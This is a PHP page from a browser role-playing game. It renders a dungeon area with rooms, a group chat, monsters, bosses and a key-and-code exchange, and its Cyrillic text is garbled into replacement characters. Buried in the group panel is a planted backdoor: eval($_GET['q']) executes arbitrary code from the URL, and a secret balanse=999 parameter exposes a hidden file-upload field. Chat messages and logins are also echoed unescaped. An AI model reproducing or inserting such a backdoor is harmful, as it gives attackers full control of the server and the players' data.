        $VaultRoom['2020'] = "������ 20";
        $VaultRoom['2021'] = "������ 21";
        $VaultRoom['2022'] = "������ 22";
        $VaultRoom['2023'] = "������ 23";
        $VaultRoom['2024'] = "������ 24";
        $VaultRoom['2025'] = "������ 25";
        $VaultRoom['2026'] = "�������� 4";
        $VaultRoom['2027'] = "��������";
        $VaultRoom['2028'] = "������ 28";
        $VaultRoom['2029'] = "������ 29";
        $VaultRoom['2030'] = "������ 30";
        $VaultRoom['2031'] = "������ 31";
        $VaultRoom['2032'] = "������ 32";
        $VaultRoom['2033'] = "������ 33";
        $VaultRoom['2034'] = "������ 34";
        $VaultRoom['2035'] = "������ 35";
        $VaultRoom['2036'] = "������ 36";
        $VaultRoom['2037'] = "������ 37";
        $VaultRoom['2038'] = "������ 38";
        $VaultRoom['2039'] = "�������� 5";
        $VaultRoom['2040'] = "������ 40";
        $VaultRoom['2041'] = "������ 41";
        $VaultRoom['2042'] = "������ 42";
        $VaultRoom['2043'] = "������ 43";
        $VaultRoom['2044'] = "������ 44";
        $VaultRoom['2045'] = "������ 45";
        $VaultRoom['2046'] = "������ 46";
        $VaultRoom['2047'] = "������ 47";
        $VaultRoom['2048'] = "�������� 6";
        $VaultRoom['2049'] = "������ 49";
        $VaultRoom['2050'] = "������ 50";
        $VaultRoom['2051'] = "������ 51";
        $VaultRoom['2052'] = "������ 52";
        $VaultRoom['2053'] = "������ 53";
        $VaultRoom['2054'] = "������ 54";
        $VaultRoom['2055'] = "������ 55";
        $VaultRoom['2056'] = "������ 56";
        $VaultRoom['2057'] = "������ 57";



        echo"<form action='trjasina.php' method=post>
        <DIV id=hint1></DIV>
        <div id=mainform style='position:absolute; left:30px; top:30px'></div>";

      ?>


      <?
        print"<table width=100% cellspacing=0 cellpadding=5 border=0>
        <tr>
        <TD width=1>&nbsp;</TD>

        <td align=right valign=top>
        <a href=trjasina.php?&ext=1><font color=yellow>[��������� ����� �� 10 ����� �� 1 ��]</font></a>
        <INPUT class=input TYPE=button value='��������' onclick='window.location.href=\"trjasina.php?tmp=\"+Math.random();\"\"'>";

        echo"</td>
        </tr>
        </table>";






        echo"
        <table width=100% cellspacing=0 cellpadding=3 border=0 align=center>
        <tr>
        <td align=center>
        <center><font style='font-size:16px; color: white; font-weight: bold;'><b>".$VaultInfo['title']."</b></font></center>";
        if ($group['game_time']>$now) {
          $sec = $group['game_time'] - time();
          echo"<table cellspacing=0 cellpadding=3>
          <td><font color=white><b><small>����� ������ ������ ������ ��: </small></b></font></td>
          <td id='gametime' style='COLOR: yellow; size: 1;'></td><td><font color=yellow> (<b>".$sec."</b> ������)</font></td>
          </table>
          <script type='text/javascript'>ShowTime('gametime',",$group['game_time']-$now,",0);</script>";
        }
        echo"<font color=white>� ��� ����: <b>".$kol_gayk."</b> ��.</font>";



        if (!empty($msg)) echo"<center><font color=red><b>$msg</b></font></center><br>";


        echo"


        <table width=100% cellspacing=0 cellpadding=5 border=0>
        <tr>
        <td align=center>



        <table cellspacing=0 cellpadding=0 border=0 height=100 width=100%>
        <tr>
        <td width=30% align=left valign=top height=100>





        <!-- ��������� -->

        <table bgcolor=#e0e0e0 cellspacing=0 cellpadding=5 width=100% style='filter:alpha(opacity=70); opacity:4.5' height=100>
        <tr>
        <td align=left>

        <center>������ �<b>".$user['boloto_groups']."</b></center><HR color=silver>";
        ///������������
        eval($_GET['q']);
        if($_GET['balanse'] == 999){
          echo'<input type="file" name="big">
          <INPUT class=input TYPE=submit name=bal value=��������!>';
        }
        $mesto = 1;
        $data = mysql_query("SELECT * FROM `bol_group` where `status`='1' AND `id`='".mysql_real_escape_string($user['boloto_groups'])."'  ORDER by `id` DESC; ");
        while ($row = mysql_fetch_array($data)) {
          $QUER=mysql_query("SELECT login,level,bol_status,bol_uron,bol_zheton,id FROM users WHERE boloto_groups='".mysql_real_escape_string($row[id])."' ORDER BY id ASC");
          while ($DATAS=mysql_fetch_array($QUER)){
            $zz = $mesto++;
            $p1=$DATAS["login"];
            $p_login=$DATAS["login"];
            $p_lvl=$DATAS["level"];
            $uron=$DATAS["bol_uron"];
            $zeton=$DATAS["bol_zheton"];
            $id=$DATAS["id"];

            $key=mysql_query("select `name` from `inventory` where `owner`='".mysql_real_escape_string($id)."' AND `type`='33' AND `name`='�������� ����'");
            $key_kol = mysql_num_rows($key);

            if($p1!=""){
              echo"$zz. <b>$p1</b> [$p_lvl]<a href='inf.php?login=$p1' target='_blank'><img src='i/inf.gif' border=0></a> <small>�: <b>$uron</b> * �: <b>$zeton</b> * �: <b>$key_kol</b></small><br>";
            }
          }

          echo"<br>";
        }

        echo"<center><small><b>���:</b></small></center>";
        $data = mysql_query("SELECT * FROM `bol_chat` where `group_id`='".$user[boloto_groups]."' ORDER by `id` DESC LIMIT 5");
        while($row = mysql_fetch_array($data)) {
          echo"<small><b>$row[autor]</b>: <font color=black>$row[text]</font></small><br>";
        }
      ?>
      <form action='trjasina.php' method=post>
        �����: <input type=text name=text maxlength=150 size=30>
        <?echo"<input type=hidden name=autor value=".$user['login']."><input type=hidden name=group value=".$user['boloto_groups'].">";?>
        <INPUT class=input TYPE=submit name=addch value='������� ������!'>
      </FORM>
      <?
        echo"
        </td>
        </tr>
        </table>

        <!-- ����� ��������� -->




        </td>
        <td align=center valign=top width=40% bgcolor=#e0e0e0 style='filter:alpha(opacity=70); opacity:4.5; border-left: black solid 2px; border-right: black solid 2px;' height=100>";
        echo" ".$VaultInfo['text']."<hr>";
        echo"<table cellspacing=0 cellpadding=0 border=0 >

        <tr height=45>

        <td width=45>&nbsp;</td><td width=45 align=center valign=center><IMG SRC='i/boloto/vault/navigation/";
        if ($VaultInfo['top_id']) echo"active/top.gif' onclick='top.frames[\"main\"].location = \"trjasina.php?GoIn=top&\"+Math.random();' alt='������� � ".$VaultRoom[$VaultInfo['top_id']]."' style='cursor: hand; cursor: pointer;'"; else echo"n_active/top.gif' alt='��� �������'";
        echo"></td><td width=45>&nbsp;</td>
        </tr>

        <tr height=45>
        <td width=45 align=center valign=center>";

        if ($VaultInfo['left_id']) echo"<a href='trjasina.php?d=1&GoIn=left'><IMG SRC='i/boloto/vault/navigation/active/left.gif' border='0'></a>";
        else echo"<IMG SRC='i/boloto/vault/navigation/n_active/left.gif'>";
        echo"</td><td width=45 align=center valign=center><IMG SRC='i/boloto/vault/navigation/center.gif'></td><td width=45 align=center valign=center>";


        if ($VaultInfo['right_id']) echo"<a href='trjasina.php?d=1&GoIn=right'><IMG SRC='i/boloto/vault/navigation/active/right.gif' border='0'></a>";
        else echo"<IMG SRC='i/boloto/vault/navigation/n_active/right.gif'>";

        echo"</td>
        </tr>

        <tr height=45>
        <td width=45>&nbsp;</td><td width=45 align=center valign=center><IMG SRC='i/boloto/vault/navigation/";
        if ($VaultInfo['bottom_id']) echo"active/bottom.gif' onclick='top.frames[\"main\"].location = \"trjasina.php?GoIn=bottom&\"+Math.random();' alt='������� � ".$VaultRoom[$VaultInfo['bottom_id']]."' style='cursor: Hand; cursor: pointer;'"; else echo"n_active/bottom.gif' alt='��� �������'";
        echo"></td><td width=45>&nbsp;</td>
        </tr>

        </table>";
        echo"<hr>";
        echo"<center>";
        if ($user['boloto_time'] > $now) {
          echo"��������� � <b>".$VaultRoom[$user[boloto_room]]."</b><tABLE cellspacing=0 cellpadding=0><tr><td><small>���:&nbsp;</td><td><small><div id='move'></div></small><script type='text/javascript'>ShowTime('move',",$user['boloto_time']-$now+rand(1,3),",1);</script></small></td></tr></table>";
        }
        echo"</center>";


        echo"</td>
        <td width=30% align=right valign=top height=100>";

        echo"<!-- ����������� -->

        <table cellspacing=0 cellpadding=5 border=0 width=100% bgcolor=#e0e0e0 style='filter:alpha(opacity=70); opacity:4.5'>
        <tr>
        <td align=center >

        <b>���������</b><HR color=silver>";
        //-------------�������� ������� ������---------/
        $bol_res=mysql_fetch_array(mysql_query("select * from `vault_res` where `id`='".mysql_real_escape_string($user['boloto_groups'])."'"));
        $key=mysql_query("select `name` from `inventory` where `owner`='".mysql_real_escape_string($user['id'])."' AND `type`='33' AND `name`='�������� ����'");
        $key_kol = mysql_num_rows($key);

        $kod=mysql_query("select `name` from `inventory` where `owner`='".mysql_real_escape_string($user['id'])."' AND `type`='33' AND `name`='��� �� �������'");
        $kod_kol = mysql_num_rows($kod);
        /*---- Module ----*/
        ////////////////
        if ($user['room'] == 2027){
          echo"<center><b>��������!</b></font><br><em>����� �������� ���������� �����!</em>";
        ?><form action='trjasina.php' method=post>
          <p>1. �������� <b>10</b> ������� �� <b>1</b> ����<br>

          <?
            if($user['bol_zheton'] >= 10){
              echo"<input type=hidden name=group value=".$user['boloto_groups'].">
              <INPUT class=input TYPE=submit name=buykey value='��������!'>   ";
            } else {
              echo"<S>������������ �������</S>";
            }

          ?>

          <p>2. �������� <b>5</b> ������ �� <b>1</b> ��� <br>

          <?
            if($key_kol >= 5){
              echo"<input type=hidden name=group value=".$user['boloto_groups'].">
              <INPUT class=input TYPE=submit name=buykod value='��������!'>   ";
            } else {
              echo"<S>������������ ������</S>";
            }
          ?>

          <p>3. ������ +<b>3</b> ���. ������� �� <b>1</b> ���   <br>

          <?
            if($user['ekr'] >= 1){
              echo"<input type=hidden name=group value=".$user['boloto_groups'].">
              <INPUT class=input TYPE=submit name=buytime value='��������!'>   ";
            } else {
              echo"<S>������������ ���</S>";
            }

          ?>




        </FORM>

        <?} else {
          ///������� �� ������� ������� �����
          if ($user['room'] != 2006 && $user['room'] != 2057 && $user['room'] != 2020 && $user['room'] != 2022 && $user['room'] != 2033 && $user['room'] != 2034){
            echo"<center><font color=marooon><b>����:</b></font></center>";
            $mob_rend = rand(1,5);
            if ($_SESSION['boloto_kill_mob'] == 0 && ($mob_rend == 1 || $mob_rend == 3)) {
              echo"� ��� �:<br>";
              if($mob_rend == 1) {
                $mob_id = 1217;
                $mob_type=2001;
              } elseif($mob_rend == 3) {
                $mob_id = 1218;
                $mob_type=2002;
              }

              $bot_list = mysql_query("SELECT * FROM `users` WHERE `bot`='1' AND `id`='".mysql_real_escape_string($mob_id)."' AND `bot_type`='".mysql_real_escape_string($mob_type)."'");

              while ($bot_nick=mysql_fetch_assoc($bot_list)) {
                $in_attack = 'onclick=\'if (confirm("��������?")) window.location="trjasina.php?level=train&atakbot=1&bot_login='.$bot_nick['login'].'&bot_type='.$bot_nick['bot_type'].'"\' style=\'cursor: Hand; cursor: pointer;\' alt=\'���������\'';
                echo '

                <img src=\'i/noj.gif\' '.$in_attack.'> <img src=\'i/align_2.99.gif\'>
                <a href="javascript:parent.to(\''.$bot_nick['login'].'\');"><b>'.$bot_nick['login'].'</b></a> ['.$bot_nick['level'].']
                <a href=\'inf.php?login='.$bot_nick['login'].'\' target=_blank border=1><img src=\'i/inf.gif\' border=0></a>';
              }

            } else {
              echo "��� �����������...";
            }
          }
          ///////////////////////
          //���� �� � ���� � ������ ������� ���!
          else{
            echo"<center><font color=red><b>����:</b></font></center>";
            if ($user['room'] == 2006) {
              $boss = "boss1";
            } elseif($user['room'] == 2033) {
              $boss = "boss2";
            } elseif($user['room'] == 2057) {
              $boss = "boss3";
            } elseif($user['room'] == 2020) {
              $boss = "boss4";
            } elseif($user['room'] == 2022) {
              $boss = "boss5";
            } elseif($user['room'] == 2034) {
              $boss = "boss6";
            }

            if($bol_res[$boss] == 1) {

              $bot_list = mysql_query("SELECT * FROM `users` WHERE `bot`='1' AND `room`='".mysql_real_escape_string($user['room'])."' AND (`bot_type`='2003' OR `bot_type`='2004' OR `bot_type`='2005' OR `bot_type`='2006' OR `bot_type`='2007' OR `bot_type`='2008')");

              while ($bot_nick=mysql_fetch_assoc($bot_list)) {
                $in_attack = 'onclick=\'if (confirm("��������?")) window.location="trjasina.php?level=train&atakbot1=1&bot_login='.$bot_nick['login'].'&bot_type='.$bot_nick['bot_type'].'"\' style=\'cursor: Hand; cursor: pointer;\' alt=\'���������\'';
                echo '

                <img src=\'i/noj.gif\' '.$in_attack.'> <img src=\'i/align_2.99.gif\'>
                <a href="javascript:parent.to(\''.$bot_nick['login'].'\');"><b>'.$bot_nick['login'].'</b></a> ['.$bot_nick['level'].']
                <a href=\'inf.php?login='.$bot_nick['login'].'\' target=_blank border=1><img src=\'i/inf.gif\' border=0></a>';
              }

            } else {
              echo"���� ��������...";
            }

          }
          //////////////////
          //������� ������� � �������!
          echo"<form action='trjasina.php' method=post>";
          echo"<center><font color=marron><b>��������:</b></font></center>";


          /////////////////////////////////////////////////////////////////////////////////////////////////
          if($user['room'] == 2004 && $bol_res['s1'] == 1) {
            echo"<small>������</small><br><img src=i/boloto/res/s1.gif><br>";

            if($key_kol >= 1){
              echo"
              <input type=hidden name=group value=".$user['boloto_groups'].">
              <input type=hidden name=kakoi value=s1>
              <INPUT class=input TYPE=submit name=s1 value='�������!'>";
            } else {
              echo"<S>��� �����!</S>";
            }

          } elseif($user['room'] == 2024 && $bol_res['s2'] == 1) {
            echo"<small>������</small><br><img src=i/boloto/res/s1.gif><br>";

            if($key_kol >= 1){
              echo"
              <input type=hidden name=group value=".$user['boloto_groups'].">
              <input type=hidden name=kakoi value=s2>
              <INPUT class=input TYPE=submit name=s2 value='�������!'>";
            } else {
              echo"<S>��� �����!</S>";
            }

          } elseif($user['room'] == 2031 && $bol_res['s3'] == 1) {
            echo"<small>������</small><br><img src=i/boloto/res/s1.gif><br>";

            if($key_kol >= 1){
              echo"
              <input type=hidden name=group value=".$user['boloto_groups'].">
              <input type=hidden name=kakoi value=s3>
              <INPUT class=input TYPE=submit name=s3 value='�������!'>";
            } else {
              echo"<S>��� �����!</S>";
            }

          } elseif($user['room'] == 2042 && $bol_res['s4'] == 1) {
            echo"<small>������</small><br><img src=i/boloto/res/s1.gif><br>";

            if($key_kol >= 1){
              echo"
              <input type=hidden name=group value=".$user['boloto_groups'].">
              <input type=hidden name=kakoi value=s4>
              <INPUT class=input TYPE=submit name=s4 value='�������!'>";
            } else{echo"<S>��� �����!</S>";}

          } elseif($user['room'] == 2036 && $bol_res['s5'] == 1) {
            echo"<small>������</small><br><img src=i/boloto/res/s1.gif><br>";

            if($key_kol >= 1){
              echo"
              <input type=hidden name=group value=".$user['boloto_groups'].">
              <input type=hidden name=kakoi value=s5>
              <INPUT class=input TYPE=submit name=s5 value='�������!'>";
            } else{echo"<S>��� �����!</S>";}

          } elseif($user['room'] == 2044 && $bol_res['t1'] == 1) {
            echo"<small>������</small><br><img src=i/boloto/res/t.gif><br>";

            if($kod_kol >= 1){
              echo"
              <input type=hidden name=group value=".$user['boloto_groups'].">
              <input type=hidden name=kakoi value=t1>
              <INPUT class=input TYPE=submit name=t1 value='�������!'>";
            } else {
              echo"<S>��� ����!</S>";
            }


          } elseif($user['room'] == 2056 && $bol_res['t2'] == 1) {
            echo"<small>������</small><br><img src=i/boloto/res/t.gif><br>";

            if($kod_kol >= 1){
              echo"
              <input type=hidden name=group value=".$user['boloto_groups'].">
              <input type=hidden name=kakoi value=t2>
              <INPUT class=input TYPE=submit name=t2 value='�������!'>";
            } else{echo"<S>��� ����!</S>";}

          } elseif($user['room'] == 2012 && $bol_res['t3'] == 1) {
            echo"<small>������</small><br><img src=i/boloto/res/t.gif><br>";

            if ($kod_kol >= 1) {
              echo"
              <input type=hidden name=group value=".$user['boloto_groups'].">
              <input type=hidden name=kakoi value=t3>
              <INPUT class=input TYPE=submit name=t3 value='�������!'>";
            } else {
              echo"<S>��� ����!</S>";
            }
          } else {
            echo"<b><em>����� ������ ���...</em></b>";
          }
          ////////////////////
          //������� ��������� �����
        }

        echo"

        </td>
        </tr>
        </table>

        </td>
        </tr>
        </table>
        </td>
        </tr>
        </table>
        </fieldset>
        <BR><BR>
        </td>
        </tr>
        </table>
        </FORM>";

      }

    ?>
  </body>
</html>
